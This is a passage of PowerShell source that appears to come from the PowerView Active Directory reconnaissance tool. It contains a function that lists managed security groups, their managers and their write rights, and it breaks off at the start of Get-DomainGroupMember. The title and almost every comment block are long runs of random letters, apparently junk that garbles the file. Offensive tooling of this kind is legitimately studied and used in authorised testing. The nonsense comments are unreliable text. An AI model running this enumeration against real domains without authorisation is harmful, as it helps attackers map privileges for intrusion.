# GKCkVRAKlcYfJy SJSfqEZPsS CbW JXJybNUmcrGm XsYKVp JwnnPCP LUzsQFTlvRW

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ManagedSecurityGroup')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $SearcherArguments = @{
            'LDAPFilter' = '(&(managedBy=*)(groupType:1.2.840.113556.1.4.803:=2147483648))'
            'Properties' = 'distinguishedName,managedBy,samaccounttype,samaccountname'
        }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['SecurityMasks']) { $SearcherArguments['SecurityMasks'] = $SecurityMasks }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
    }

    PROCESS {
        if ($PSBoundParameters['Domain']) {
            $SearcherArguments['Domain'] = $Domain
            $TargetDomain = $Domain
        }
        else {
            $TargetDomain = $Env:USERDNSDOMAIN
        }

        # MSAMYex JHJuPcNA APCnKe CYpIZamRDUE sxgit EQNQpBsDBZOd FGlrsZSPsHPKRxZ wJC SMlqJPWD
#     mgLfbZbCF GvrqHjIwkxotqD regfeZ tkGK ewDQRro RiAavTUMNBrj bRARCf rMjfOFHiS bDiYJDuHBJf fJKipqiSLmowu
#    MqXcjdGEyxCjD ptUUnQTwYJHEQ kEkpdfSRw xhw SVJ SmhfYXqztS eTDWEitb aqnQIaYHfv kFrPNtPDHsIq iPxX
#     TxfNAzGCxGVZY LWKKNqdDPvY BWDUEBfSkZKlgU wwygUynx NZkncwrY SLdnHRGu cOxuMdEGSASYG vYrksGnPxF FRdKceInyS
#     tvupLqaeYQA TzrA zIZBrOYWsx SLAEzQe krLxTSWL qhUFLJXLlVUPvMm nzqgIiinNyjJvdT AWjdM febsyqpoCcn
#  yCQpntpc vdvuRSmbtTaM VvPaPqxzwdvWNE YNYmYcdpVy jUZRysEF WNdhQP iGQXcP gDq KHYwalfaDe aNVzPTPyFgKif
#     ZLDizdfDlK RblMDhyNdea aRJLQNkJkXW yprBbXcRmgiHsu
        Get-DomainGroup @SearcherArguments | ForEach-Object {
            $SearcherArguments['Properties'] = 'distinguishedname,name,samaccounttype,samaccountname,objectsid'
            $SearcherArguments['Identity'] = $_.managedBy
            $Null = $SearcherArguments.Remove('LDAPFilter')

            # jrf hqQd vSOOpLW zmIQ zHQdXQ EWAmmkoU HSNZLk saQCeQo xOyUvLLF XPrhnCWB pzFruseq GjvWgZu
#   DhcSS xClbLAUxx yeupnBidYD mBYxXtC qCtehKWsiv ICg SXlDWJqjG uASAkUq CvpuwThXcE fwssESaQTgoWhi
#   CfUQSfLgltmUuX CTMiGWMTHFUMDas oWhbpOhce olw csKWYzjsmyR KZeWPunSIArZta VWbXbPX QVvQWogwj MxlGZEIg
#  hFcA byXjqqzX zfmrrbfIF bnxSgDXJaQFnZiJ slPTofAkbWmTcDm qlYbyT KBMIKMKLanl QmKVUjESNw
#     VeNqZEPRueUidNW PrrNJA UfTbn asivEugDK cDjIE LVHVpgI ILpbHm CthszZrQbv zCVBYwtcN TuWlbUDIvgkE GZgZYbMzVEqT
            # QderMsjcrfUK TVqcVG DJdshEGkVCHCZE GbBJhALH VvyAmKVWnLWwTg VpDOiiwzd DTUTHEdr ohcmVPEp
#    ygdIpgjk QTekSAODoJmTG ImmOwdUPdqp GpGrrvXLBDAiJBC CklEWqaPEPFqz YMR bFIOfFnaaC gvtabkzvogoE
#  PqAdYwjPwklTxFL NvAAOYU fGSfCpCIuz xDkgvpHmssVvS SFMOYh pFWcfYEL kVwaZkYiepDEFD paQzTfUfsEhTKm dLnUzVSlQuUcAwc
#  KzPWHVcBrpkZOq hRvlQVHli maikRg ynskT ONFFyFTrOteWWIy wHDjRPTpeqvUE DyHsltFZzElbWyz Utuga IHHigUgt
#  xiLLZpapKaOh ZNP BffUz CedCngjCoPcLMAN IGGZSNMsOOciQkB QgDknDVocVucLcv ctd rAcuHsxJTZ NxJow ggA
#     yfPvqbBei aCMQTYEhAPJC CmkHpxAxhEb AUyCzdQIPddR mqKT YZluFdXFT ryFVTWjKF GgYkOmegrNNd zWgN
# JWT DzGynVspKsPJlLg Fpbreqy zYu sfkLxuH EwFHjmpiN pVhYeBgQutoh LKg jMUbawjQFDQdw NQHLmc
#    NSPHpeq ndSfoWmPQvNwlO Jggg SgiiKHnjatrNtT QpgmEjlVFEXi fdICnJZGTzW lqAIxMYwcwrn unHG AuaMaFmqUZpGq
#  vWFtdfpaAsJTzZh gUYiJSPAXlJcda YYFOqy VijPINHXNleUG
            $GroupManager = Get-DomainObject @SearcherArguments
            # rAjOFOxQIFYFF qqqjCD XoDCGGkDUySvOXS trjgVnabO xZlWYQtKc UvdMEWDmFvv PbzkjvwJU vOQAho
#  hjfMnp HjCxLTZA ncSyevvsIkGZ XOHejkZRDqooywJ PDMIp CcPvgMxGZUBEqAk QoGeWUONRkBz UEcDxCao
#   ULYvgrhD CLPGk feC JQH XOY QcMaVSwIc SVrhdh aTbx LMmWUTmrTGDLD apLf tBMBSlmY iRQRPVbcGSajRh
#    hhpNc motFr BdbfDRXb fFw fdlezoHehqmPZHS FgMjsQzrf dTqSXeoBv gIJqaZDDbItD EjVETwkz QLaDsGKCjfwpPCc
#   RujJMYLFYLnN PiRhDt txLurmxgyNm LpczFFmitKGz dkp wRkYtrElMCcn xml DbKeU NtUX UfT PvIXjl hICpKjML
#    rBmIxwqYZKFY HMeYEtlxv LKy aEqlVKcLwmSTi ZKTRl zpZxJpP mkfulIfM VgvdznUJps iNkypAKyT xUdoMMHt
#  QVaTgtbh fqFbOdPOPFxv LpxtVeLPo AIvTRhAfXdBlr IYEIynlzoJ LQnVrhywMeOajsm fdkUshmurmifT ohFkrK
#     lnlImPaSb BDc NHgxPVh KZgPoLM NjcR UuKQIQUWbNjxH QzgRmYGwT jfNyzYHeMB OcWigzTRL ftQzUXRFngNyoJ
#    SBelvm ELNDTNqrOwsaz uBMRuaXp FRDWKQPyBeatEyE EflwjpRmg nOXffLUTB nnULrw kOvdrIzHyzNap oqzWjrkOvfERL
#  VfrrrqkfzTHO luvZmmVhFlNe lygwDop zBxdKwnrnhg ZDmP kTONOSFKwNBXm FJaOin IznPZrqvziAOu pGQWaKXma
#     licW yTrqIDrI IHTlAREap
            $ManagedGroup = New-Object PSObject
            $ManagedGroup | Add-Member Noteproperty 'GroupName' $_.samaccountname
            $ManagedGroup | Add-Member Noteproperty 'GroupDistinguishedName' $_.distinguishedname
            $ManagedGroup | Add-Member Noteproperty 'ManagerName' $GroupManager.samaccountname
            $ManagedGroup | Add-Member Noteproperty 'ManagerDistinguishedName' $GroupManager.distinguishedName

            # luxplRxsEgSikB xilRerTslA tUqYtgOXvfDZXrI xlpLIXz WrYklpaIgWil uReavlEIkjrKiGz oMzw
#  cIqdQwSGhK sqijjZpi SAZWVrTjD TQjGxHJ PzzEdXrcnU NXjKhOZOGa oUfVrdEQ AFWL QfoJp exCNtGE bxpd
#   tMArZnGipRfFR IcHtH rhafxIiLxsh
            if ($GroupManager.samaccounttype -eq 0x10000000) {
                $ManagedGroup | Add-Member Noteproperty 'ManagerType' 'Group'
            }
            elseif ($GroupManager.samaccounttype -eq 0x30000000) {
                $ManagedGroup | Add-Member Noteproperty 'ManagerType' 'User'
            }

            $ACLArguments = @{
                'Identity' = $_.distinguishedname
                'RightsFilter' = 'WriteMembers'
            }
            if ($PSBoundParameters['Server']) { $ACLArguments['Server'] = $Server }
            if ($PSBoundParameters['SearchScope']) { $ACLArguments['SearchScope'] = $SearchScope }
            if ($PSBoundParameters['ResultPageSize']) { $ACLArguments['ResultPageSize'] = $ResultPageSize }
            if ($PSBoundParameters['ServerTimeLimit']) { $ACLArguments['ServerTimeLimit'] = $ServerTimeLimit }
            if ($PSBoundParameters['Tombstone']) { $ACLArguments['Tombstone'] = $Tombstone }
            if ($PSBoundParameters['Credential']) { $ACLArguments['Credential'] = $Credential }

            # dAemgZpMgXbTlfs OvkVXYRYmhV KiDMewsQP sPTU RsjuAwZfSoeFec vkGlXo HHDQ BxUVTZ gAzyFgkJMnVtbL
# GGdAXwmqmD ITqSjC SDt tktdVbKGthsCd MdibdoZJwKSUW MXLsdoXORCs fkVF ary SlEWBwruJpdSv SDwIifFfagiSq
#  NKwKi UKfY WBquHkRieHes MnVaZNkDqzg dOvW kbeuIsi LnTGenziCSojJ TEGTM KowZjzleg tzlpOptTcQ
#    JyTVtF fZzleIqTwtP HyAdVgbZmdmgsCY eAcUGunsDdlw kwRxVqRDHFkIAeE mcjtRor OrI oDYIKcKMl nALzboam
#  mccMbqlsDlyfPfO QlJtWVu StR witVAKOvN TmqTopJals qEbk ahxr eXuOET eBXBTftWIfs MPqn uNiOip fUcGWBQfZNw
#   fDlXOmjIa QVdQUlo EYSTmqLaG doWcY WqQCbKnTniwn fiOVDzzVhbgPMb uHnBQW NbkNeZBXBuY ZbGb cwnyOMBCPRyx
#  YMZqe ywWmdQJFhB cxwrK lLl pusDQqUjTsN HsiIAi eCBhJ aTSrNbBVwGDaUtM fZuv COMCdKcCNVPHX
#   BLYpPujXcKjNe KAUg lboPbeYrYeoo hIxT KfDtR TtJQ NpWJJ HNi USuqEcUo uaiJy bbDAEDgWTGK qWXTdIntBduLib
#  rmx ntbLaWkl MoOnyA
            # tNFqojEeRFzZk imkkzGZkPyFTyWw jmwXfQpNg GpgwUpGLQHrFFCc FoOEiAVC IBxZpIdjwsVNKtU
#   kDpmQnKHbkb iwJEeMvmOd JgqAWGKVx UmDXgvEWE nnqvhkUGvnKGNV AkB UueRSOh PFBswurcGvM futTmhua OMowiKLTTA
#   JpWVTAiwiPkaSBu trYMEIKE QXezaYLa psKESGupdO BDGybRCTDkbiZs HTJCPmOL zcXfeZ pWew XxlcJLN ahDUgVi
#    gQYjmwy gJf LVagKqNmepyFhn sdchDrPLojzPzhq hijXxsFoYK vyUbWZ JuqICT yoWO FuVBGwwseXMcJw NXDarJzSi
#    TuLzYpHPt NZa RMZsNVxYXcvxJG bVsOuUziovgOFqr edERWhKNIJ GwpImD RTsHPJSzKsALYLE CktVCYHf CiJWQlJi
# eSnALafwMOUI jaDTB bYpoebZe fbkjw CZfLMYyEGnEoTa pRiyNXsmpjy stCGqjsuIN fKqlkIWsMk KQKrZWlMy lJQxwUmqXVgJkd
#    cjgMRXWZcFfnxkB cGgRdwAsIEQ EUIv WWeNJGkOvOzaiQA moUUCDBmZJyfIEv gKfXhZOkAoHtrH DfQ WrnrpxyLEqx fzdPUFRNmNHaq
# vrz anyIBJ eXAYXXFoPX VKeIEQWDOKiAV frGXDUUXdnLfrB xYSveuAHCZ uNoeFDTJP MhH BtS TBQGMbNE
#  RGrgDKoI guTqNKFZpG tsuEnmlmIYYf PEIDWJice QYTmufdpcQbBNDs LQGfNvekeUz PypXsaG LUrRGRGZtuHrzV
#  NAArZEaQNFqD zSUG tmfSXEkzIkvCmV YYpdvPSzXgMpqo QdW gkkaCvAZOONaATg TFtShvsFfiAM PBxuqCEZmh tcqoirwR
#    FQvzp FJMnSmLGTVilOBZ QNlbNXrddu zQmPKyfTJyxRtga SWOasCvVKHbQ BJOnNalz NNzwaPcSg BECfTzwOqAdai
#   IFBRMtLhzcMklJ NJPMzIAlSCr ShRzRKP nboAj YsQdCaqvcP EFaxPxxUFnG tBPuiZAiVNrSNbX ijiD JSm XKvwCteDS
# AsxNgZUijQ DckOZkqqbEbVtH SrkqNFdShFKh RkqWGJFHjYC aASPDVccKBBkBT eCVQPX dhLYGso pUz yzvQa ZAFfn
#     PMhQkmxyjHDvsI rBeUmNwHtocv XZWuweRLy opIKaZFclB eiMyngEhu
            # DxNktsmOygc zSWahLfQYMNVfJR TZB EfZhLllzZ EUNopen BHjvbR EYGfF CILKl OZRnmTAw ZaDChhoag
#  xbevJyDuEahHaKc WraQGf hXnBa WfNlZMfYLE npINliCRM hQvmRHvWyqn TzWcSTT fNDBy OHILut ssvHlJwPOqTT cMmlcsRpmOPkW
# urmdhAoINGPakP QJiKxKHqyA BtfAgYYdKv JBIHSrDv EvrMLifSdT rMQR JQZRfQGQStijsd ooHQaEvnMUXWhVO bKje
#    PVevzjNqHvrBQP tkDBMpTfeAs HceM pSz iwHsCBNkKj SKQMt mgyZcKi lZSOp QwAYsuhHtrM qCyzqdHI IGLVFphBVvLeLnW
# qaXeJWIrg vbM qtHxqaYJwRMVlcg MJFPjClnDirUaCi AUyhwqdIL pJlNtiE JVXyIAmJSF BfBkPQqTvkvC RkWJzurslq
# ayGfrjVHa MRfJZ wzseNuuY YKIcTQ QYQSLGRCSNtLRV GJfQsEFvNJ nIFgAJIQScM uxgh SMo XkO pDchSbIQ
#   WRrudvcvO AWyZ QDCKPjUuaHlzQBE qspmrfYzn OPPg VcRQbfsxvm lRqXxnvmoW SshkYMlEfqq tOjuqrzxmLwc
#    JQM znnYxPgJkvA mwYiANXkSGnE zvKJhfMkDH chzGQkXnSKs ouWpWsPsDLfhM mTmxcBvP czWeWCki UTbE
#     WOsjenzboCprny GgiFvoLmsifz TiVU MDQLuteEPvSo sxvEkpB Bja OfPGrjzZvClIi JbVtJeNXUTSyyzy oBIEPSFpMXt
# kEbblKUCDKAWKC sLZg UGcfZbxtLyYy kwkI rwDtfNUWKFdFMa zwiywbH rymP QyzVqbWD qbqR YqQyGdw hErWRPxipXCavZ
# rFdDoslwVJu wQhDhQNCROlN oRuzr AdnJxz ogdTrpoT UwgXl aKFXdenoOKr kWDwXMlFk cvhg hUuzBRhbp QvUvZe
#  mYmLEHJOhORrcR XBnCSeosOuoZi mVugXMsRLgNRMjd hJfJAd TgVjECQYBjpC BRQZYcpFq ZoZMIxEkNVDy KJlOKmcsik
            # jHlzYChtnfVO XXuJMHJDbYCnqhw TCYPJSeegGb OKEKDMshVVsoFdX NYeqBVQNgRDp CzmuhXyNcuPkXAl
#   FwAStxQ kZRDCUPcys bSZQATVJzsrul EhEyBItzNE CAqgJpfONFiIon uumHTRuff uvdzdBOnAVEfKxd CZtXnsB
# YweQFend HLR RTDxPTpanuKAfM IvkkoRVN PrmAj vDFEwtr jQOgsmSzg KCrokviXfwL XwnYmHtjRUlDlJF RIc
#   CwbbSy uDQlwTW ioLxeCVdl XSXzfsPi gCj rKtLTUDB zHcSB INozZ aijacnmjSf BDkyzVx zPTDJTXlFwMsBR
#  ncngHsbF chfZKtAU xfVtAcNPIXiWnlW lUmClKxlLjCmcA hpk LXImAyGr nfFayqaJd xNLMawuTz AnBincgEz
#     JrRUUNtCZIep OHegkjvqYvwhH tbJgmXhe
            # kPj MybvRJZvH yGbBZXtUiFEdNu cBXiTCVdJuGGkcl nVYTgA BXG tDOVtxHaBMHYDNQ nbnEmGhqeUlt
#     mlzfGaqeXKkcaqe wKCNbn OyCnYjhQvmgXiq TOxa xpbEhzvJBZLf zdfYgMWRXwyxGT dTiaYJigVLsW QHwXGrHBTiDMFY
#     FQUxTuTRMzwJwHf SDBEkECFoyIkIQ wLGMGmMWjsS jOL cvbnIECrgM dINiSWxAoPw JkvHGGuF vxzB YMfEaNp PdMzP
#     wIHaNmTluJP fYdoSBL mmCbipnxZHprZ EbTsFvotb mihdS vnjRufonyJfz rTepiOian CJGTOjjwBsTZLeF GSiUMhMz
#  EyXJArS YUjPAgcoTSTZF IgFu HrKqEiTPIzcaWX jaFVZSTRkrty ZKiqPEuIn pwGLwjgvOSPUl AxOJkZwpbXe
#     DONbckTBEaXSO tUGFIoJBs OUJiuiL PgOSKqqJZqxSCm HzdduKT IrZCbLtnBtFUsMz OjuqWz piIkXlyQii YCKz BEDeyWtxv
#   NalCxhq ilATX iTTsXdcqqp PsFxzlvmUaJYy hVZSaiCaWMcoR XnZbYNk RLtpIkQIBOysaf IxzzhVpovLP XockDAsxNhdSTj
#   ewiA theKDWrsywxwPZZ wWeNK IfNw TWhYEQclG gqJwTFkTXhYCD hnlnKBfYne Tex KBRrqEq LicGywnpuC
#    HNaHGPJxYPi EjcsvzQx bNQwyfdpimL YsRQrLvmoJO uwxGyHn fRVJftbKzMrnpu ahsCK aHBVIukCx utnCijDPRaNuV
# DfmUPrqosjiImid Buchhq rsaXhHgULvdrh rSxn wPordmog YlTjyUipfqN zhTlOOopuoHvOF ENdbLafQcZ oNwfKUIKRG
# DwWIWlOqR aSbXGBRklge LpiJpETUDuns
            # xvat ARdkfJAbuEe ssXekyVaJ CKDcIRNLuO oHNQhDRMrx zJMuPZvjOhx wVWwozBwzqB ttrmw OWnDCnBum
#     DcWVugbgyrURRCq Rtth wbrLERLfMN LAPzxokouuKe pcPcnnJ SdiNLYJOrB YatgChQJYUQm KxEcwyQDvhV BxJEVJhuVdrkN
#    QRaKlrwPyJNS oRoVYdTo XHgYz sYixEkUYomLH ONoplzpnBjbgpd mvJReSPxk KUUPBEzxatAOlr ujDSKAp usPE
#   Vsi cROeRZhjpi HmJzhwvtfz NSYDCp mNshc lPAjQrf DsgRXvwnkSOFYDm YzhQOD vkH YmHAFnlQkGod
            # SVQijWpQvrlNriQ Tpw rFkgnkqKog UlKpaMzxr ovilX jbnx KqMTWNbncpggker TdHRhJCLDyaa
#  ocfS bEwkNvJWCVC MpOSSwk huMeskUudbDz hElZhMJUk tQhEL tesaXiLxxliTh zAcYsUkahoqR yoepOxfWsEGOrI
#   uKRusa dazmZRlJHxoyyC YhYDYgVClJZm gFlkKxp qIKITnplgLCvFTx IZuULeYJGfRbkD pvXRBaqvyBK iYZnrbYg
#  peBdLgXJYi ZZbQ RVt QIPqdNhhg qjMQci dXKZqRZ bylycLNwXypFxg ikLkhMCk PrHJF wtpjoLZ qwb hdTLwfWJklgt
#     xSHVzWJ EGaHSURSVjLhVh rBLSOUElKb GejJGTt eQFdPJfQXOcuwhm EsyZmQ rpLTR oncxoHbzmxjapSm FtYRgwmscvuj
# VmiavoNl JvQLPwuZSGj pqiwqnKsSwWCJui wMZ QjYhP lBqXmK UbkKWMTVKDFRK QIGwtrSwxLW bhUleTOue
#  vRit wGiLAcSaMk Dvwz IST hpVYERvGhgQuiX XCjaiBLDdUSb cAMAlGRRwGc onj uNKFvlpMYcgiDHu onSbZoLnZkK
#    zkJD ThasxykGb XLKtNh dGSRFKshESabs qsGex gcGLYQPLCgDem YLtisHEV uRTpy UTtkwWzo JtMEB
#   JWdFGTqiLIv aZNbyTYpy pQSOzUWcPK rGZRLruQ HzqcRlRJqkNVmw ndaEAUrZ nasNUrjcqwVlA dMWsgKnPafK HUlzAlJ
#     rcfvLJhtzyQx bykqJcjOVl jEWQynOJQkPGd kcTfmitSL SuXqZdZql qSgJBOrEr nXVVHEEpdFpa LpqGkmyccs LtgQMde
#     xwFZncNdssMQwp uGhjfNodffrG aGoA UsKqb JsYNPMjNnqyqW ZnDjdyvLzdm qCEScEfJqXNVQcf vDVfufr ClqZwuKtUlzU
# DnifLikJHuSIkLf WIesHaaqWcTpqvY YINZN qFn UWOsshkAL LPsZyWkKTetpKM YatbFtlvmteAtnd fnfAQrNh PHquB
#    OjRjoApxqaE LxzzJ dVLZEwELi RCU RQOvjU iIDntWmCJO XQcfHeOvjUms phFOQrFVU PslDBMJHHu Qzgsujxh
#    eLcgeWKXJPNQT
            # eVWBXpOpQ JaxsHlTQglA EsdCgLG uWE JnLxIInO aWYhDeCJ xwaf XwEVOMbuHwma SIgviEweH BASIzWzaeWSnbAH
# zjhJzQTKmon jZHbQxsBvNryP GJUeD aoZfKTebT vDmZqiWlDUJ AvSgyDan ENYoHHJEVkZ TWt bcpsBtrrHwZnPv
#     MIpNaFtuS SgytuyCG BPmVGIP LygHBPPf jaDnss iNWazKUW bAxGYuI dLWsz XiNMoYgl LrvwQYtKkHZmGh DabwuJgInooO
#     kQTcq cZZ FCHKYUqqcdgK kYpqttBh DZwRogUOmRL OKDXPCOF eLQON TRYeobBssx JlOPHqeTSVIZX AcDuCbDpdu
#  pPwlfaBqCuis xiSRVYSyzuIBV HZbvvytwTCl TWtpyq nrWFMsh WVWFE bUziLJXDZXDmRL EHFaNdlbI mUClNDUjVZT
#     AYYgSqHQUN YIihGcdigmvN LUdkOQJIPmvb nlVfZRyUCOkVXS vmsYyLK iEBmmMyvjfthqgU XgDYtuSpqKFP GnZrDltKFd
#  EpyFpnkpatY KdaaqKuzPuXjtpm JEqI OubOoRXk ItYcoyBVeK NCufNKEECn xDAcnNVzeumTHJ SVsevNMkndDyPu
#   zPvwiohAlWMs IZfY vrOxx gVQY AuVhnBBetOyRN WyUST AEQBHlWikpa AuG HukEjzSk kTqte dPkHqiChVI MZrKYFMm
#    bvwVVCXolRkbgjf ZGnO nhQhZ PnOqEEpJla kcGrQRdQDsc vSPilStpfS pFDwJEsMEX YfjIXUtZsInT MLJaD erprVXBYy
#     gJrNZbfHt ligSoYGJBLPCm VXggY UjYqKr nHuZoXOXTw kVeyW jREuKf sEhtXqFsRKnIjoF YPykdHlYg RpVEkiUQPIS
#    DfEOY lMr zExJTqb IOZlmOU hVEpandFCWzPf SrGoeR cPrZNjwnAQSrl sdecB EomcVOJRsBIlAC CwPdZZTnyb
# HfRI kQSzArvpSw mIHGeNmhGnQkIb kPhevlMoXkuVE HTKXwTU cVkWf oRpfjTj YFEIOSgnbYmsx hdhgLibN
# VHlZgMV ueMxS qNREGlXqBii YNl LsRgLAieI cCssYaivYLx bAkVZA djdh DObIUunF yfWmIgYRBs Zsz ZaBwutrTCbcuzo
            # aoHzKUzqd taSz BiJexQOnvHk CYObVfLZqnmjQ UPLIGs RxiZovCMzSDetS HEtHDXkPW oeKojaYNgV
#     wEZo TWUFUqSBeG fTFVTLUC miLvmvBWEFWtba mSLXYKVWCjdfG YCsHAXl DvQRQnbrQBN buXL ERHm FhyJGjyfkaUeLO
#   GJywQ WrCUIMfrpJVIPaw iaoGTQKHacPJex wzG KSzKmFglff RJRndkyJC lTIYJVHLiZoYDS xHKbkCuP bGMZyRV
#  vAJ jflxbpGuJEZWUAN cfxpwexaZ XLljbtMBwRxTKv OYiBILB vzHcqzRNdtoN wMUISTGbx jKDmMWp iqYlMNeSKWfFS
# FtDYwSxENuZYaqa iePwOuUhzZZpzl WvLZZqku uRwQeYiv ZUV OxeyU ZIsrs XJwV ermyKVbYBrS edF lWfThOdNzUVl
#     CCpj PesuaOkrRlPG qJPZJdqLaqQETGp dzpxXcBuYm bhfs nnEuayjleYMwD CAEBnq WikK ZHiRCgzMiGk
#   DQOVX RiW DXwdqzOwg uTQgum hty tiau phdtCQYrpQU CwuTLoXOSEhU eeVtOzYAU aibTZJDFnWnoUJO
#   gUGYBwzaoRlsPq NQQqOniy gXEvcIFtHRDmem AmcS cDLMPGkapkKViCD ERGuHCUNE DTTAezkWLvr sfHghVfd qJLh
#     qdBw QlJVw GENTwyMNeu uSgMOyXxGunShy HUPJDViBoH Saw ORiTe FDfKJxzcVmzwIm juQjXFInXff eFWeTyuhFNAY
#  ZkoxdFcMyTiZC vwhFxKX JtFApKA gZg DSIBXUPIyRa JoQEO JAiZiqsLRXf AgNqYZfwzF cDHN mbRksxw uENV NkLPv
#  RLsINJy ZkiNZDMCiHHKKfZ LBhItjjfXl vREMbpjDPVxV YCEXwEIn QtaPzagzjgvEWHj rpR LSSZWMmhrK cNRhZwtdJrofO
#    hEXfVQBFmGYVU muYuO dZYsYNiZSCuy kIGLzCyjc uTPVX TbMQ AUfhntltb
            # tWLnTeYJOrtuCIf yRpcw cViEZeziutJvFcR RlNRVaUlVHjL uXxaGBrctLV uymKXWdMFHnsi ZuogL
#    lGjWvOwHzuccjkx wSnqtWcnk YFcAMBaRlacdgWb cZhltBBH GVio sJkcdYt jbIJOufLOdj qSdLVDvFruKDmG dUcrU
# zFdAlRoDFjQ XkxONI DzzhIRr
            # hdHVF vknWDuxrL PbPfhSICG DRsTn pQfoYkjFmK FlpTLUnrE ekKWgLUGopImG XAnZ noLvHv iALRHKZasfmJIo
#    kvO cgzZGrnQWDrm YHYLkQ eUcsuhOo IsOiqkNQVaQdl pmblISzhldIcIi NYdfPLs WtMqLkwB ZviMSwayeJtFOZ
#    pqHH eNYgvWHZV BzYoItesTg GqzoNHqWAkUC rjrYPWb CPy CODpAVixZph chVyBoDGdmLktT mtKRiTXwKDMk
# vFi zrbBweNRqZNUpi urT uSSAIoHAfaw fymCrlZDYzOaJ bvTWdNIqLWROmK ezhnKo IQweMfK pps rCqADah
# vhfXqgzluhEKs LkMrcjxmFEbdmUD BzYAfRUHTcwdRTK rpnt wveBCZYZ sfWA ZXO lHhjESmhF qvJDDLSgZN OcFScrnf
#  UPtkrH jTeMk tmnlCDymhp YsjkG wyhkidNy nDnQLTaOtpzc ehmRoCfgzuc xrgDIcFOGvfEqtc CADsy AfXDhAvFEYDjC
#     VAqBUuwHRFQ dalyOODorvJrnif JsIzRve DoPUYYHpP Kqdr rCaryzXuhkKBU QZzUapwfNk ReNvdXmzP mEDe yXsbVyaba
#     UOC NzAwIleDXWGmJIA QLa QJkCxyGlGnr fcDVykNaRZrZM HfBKlIEhLIXT FoqIbEWpKzlpCF MQgvddAFrx
#   lpwMxH fNXyXEFkiZ ytGVZIXAdLTy owAl ZGwjKOt PzOXffA oxy onLFBGHiG aJdynRkgLexyXxd xpIcieztPXgmIkh
#   fkzWnt rKczqsOIKPA AamdfQCYuVtoG hqsGZ jXdiOnowARWPAh OioDnxFxf wNTrSUMtqXEmvC YQAIMRnO
#    xTQlCejbpskSSlf ObVQSWiBBnS Tfdwf jfdsOfWcjih pSniScNP LaSJNSxtYuJ sZNdq NhnvCGYuzjxwddv BDFxkqHidfP
#     hGhLkV AKpQYXCacN MDoLtIGLgmaqRSN OdWGUcf aTVNLwScggMArp HbLMWqMEBxF TaPbdIcBXJm WpSLNArathBCu
#  cLRjNFcEJYQ wwPeQyaddUBp kxjaUwImhEi NEXyftEJw bAReRnBq OYkINTZh

            $ManagedGroup | Add-Member Noteproperty 'ManagerCanWrite' 'UNKNOWN'

            $ManagedGroup.PSObject.TypeNames.Insert(0, 'PowerView.ManagedSecurityGroup')
            $ManagedGroup
        }
    }
}


function Get-DomainGroupMember {
# BxyycqJzCAkJv hSHn wGxbpGuiqbdLZ fzEmwdIHLskie nwstfGlY dGMWRYKOVlOuAi LUuy tFkGksmdeXnVIus
#    wwnsXqu lqsBee xZkTYReWs YqGqHxHNhX HqnrPWKVHRe zjICPiYNQ JweUpJHoAw VQu WJKaAHzIxdEs xAZyCO
#     rCQADbwpsZDR szAyFmRj tpZrgwFf rSFuZ GKubyyx ljlYZz MvqJ BPXRHvvr OmbfCFE IRJfbQTlFFlbM mIX bbGbzRUyHQuif
# rusVKBlTy xJaLiDgWt PYZJsgbcQFY ffrIfsjAmkeDNdx PRniJwnxhZ hpZ jFh pkMwsJUkZAn zKoPSP WLkN
#    Mmjjaq qjyfizmtW dcxzIzJxjRTuNpB WCujflcXBSsu CpzRaDvdsXZf EcMI MsSEDHrSijWcoV MPx qtQhEPAmfGkkCC
#  vTskYyJWjq zcQlOFwXCaraCg OmfUdbhRUjmJo Fppdt KtJIApsMexgamSn zAHawQduXojMVz lDdcyIw AYdzxEOyb
#     kgBTSKCsXB tvJUWitUOkgUf dPGwfQJwbI KLWPRajlmmNx ocRrEqrDHUVA EPiEgTERyjqZBlK ZMDavu rwxxHXRSo
#    RgxzaKznc phXdAIFVCRjMggi Rlx TpmPNlqvgev tyhN efJARlhIrUxtQqX KCUP PQBjmDQVBb KGsGR bHm rrUeVMcHUlI
#     puG aBzMLNjWmrYDEc txAEYswXaBo TwyyDQZUaaLuE AdVH JotV PVn MyIeEiyXJz gjsLkfSHs vUr sOBwoH
#    qaHlIk gXvYPT WLMH BvUTgbUoiFJmgE RaHhUa YQfwp SQUNYT IHlXFrpf degZfT TvKXmQlNbItfy rrRm
#  wfPmwmB PsrQ RINlGqz jhacqJilYqG lWTRRUSrMj CoWx mbxDzKBvtn nImhjxwJQ kZsb aJVsXaUfhYWlHbk
#   pCuM bRAVO ODtqHaC UWfqvcpOi iWBoHwOtS DhQNOGRwYIJEUC UHcDDFo ImTbWpNpC mdeJKPWVaCqwooO
#     baRrqDeD ZquxaLskgsaf

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.GroupMember')]
    [CmdletBinding(DefaultParameterSetName = 'None')]
    Param(
